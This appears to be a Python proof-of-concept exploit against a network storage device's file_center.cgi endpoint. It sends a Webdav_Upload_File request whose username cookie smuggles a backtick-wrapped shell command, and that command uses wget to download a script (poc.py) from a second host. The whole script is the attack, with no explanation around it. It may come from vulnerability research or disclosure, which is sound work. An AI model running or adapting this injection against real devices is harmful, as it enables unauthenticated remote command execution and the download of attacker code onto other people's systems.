import requests

url = "http://192.168.31.10/cgi-bin/file_center.cgi"

headers = {
    "Cookie": "username='`wget http://192.168.31.166:8876/poc.py`'"
}

data = {
    "cmd": "Webdav_Upload_File",
    "type": "f",
          "path": "/mnt/HD/HD_a2/test.txt",
          "permission": "111"
}

# wget http://192.168.31.166:8876/poc.py

response = requests.post(
    url,
    headers=headers,
    data=data,
    timeout=10
)

print("Status:", response.status_code)
print("Response:")
print(response.text)

